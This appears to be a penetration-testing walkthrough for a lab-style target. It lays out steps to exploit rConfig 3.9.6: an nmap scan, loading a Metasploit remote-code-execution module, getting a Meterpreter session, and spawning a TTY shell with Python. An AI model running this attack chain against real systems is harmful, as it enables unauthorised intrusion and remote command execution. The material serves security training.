1. Scan target for web services and version strings.
2. If rConfig is identified, check the footer for version (e.g., 3.9.6).
3. Search Metasploit for associated modules.
4. If local search fails, pull the `.rb` module from the Rapid7 GitHub repository.
5. Manually add the module to the local Metasploit directory if necessary.
6. Execute the exploit to obtain a Meterpreter session.
7. Drop to a system shell and upgrade to a TTY if Python is available.

---

## Initial Enumeration

Probing an unknown target to identify the web stack, OS distribution, and running services.

Initial sweep for service versions and default scripts

```
nmap -sC -sV <TARGET_IP>
```

## Vulnerability Research

Application name and version are identified via web headers or page footers.

Search local Metasploit database for specific application modules

```
search rconfig
```

## Manual Module Integration

A known vulnerability exists but the **exploit module is missing** from the local Metasploit installation.

Identify the local Metasploit module filesystem path

```
locate exploits
```

Update the local Metasploit Framework package

```
apt update; apt install metasploit-framework
```

**Gotchas**: **Missing .rb extension** on manually added modules will prevent Metasploit from loading them.

## Exploit Execution

Target is confirmed vulnerable to a specific rConfig RCE and the module is loaded.

Select the specific exploit module and initiate the attack

```
use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
exploit
```

## TTY Shell Upgrade

The initial shell session is a **non-tty shell** lacking a prompt and the ability to execute interactive commands like `su` or `sudo`.

Verify if Python is installed on the target

```
which python
```

Force a TTY shell spawn using Python

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

**Gotchas**: **Non-TTY shells** often fail to handle environment variables correctly, preventing privilege escalation.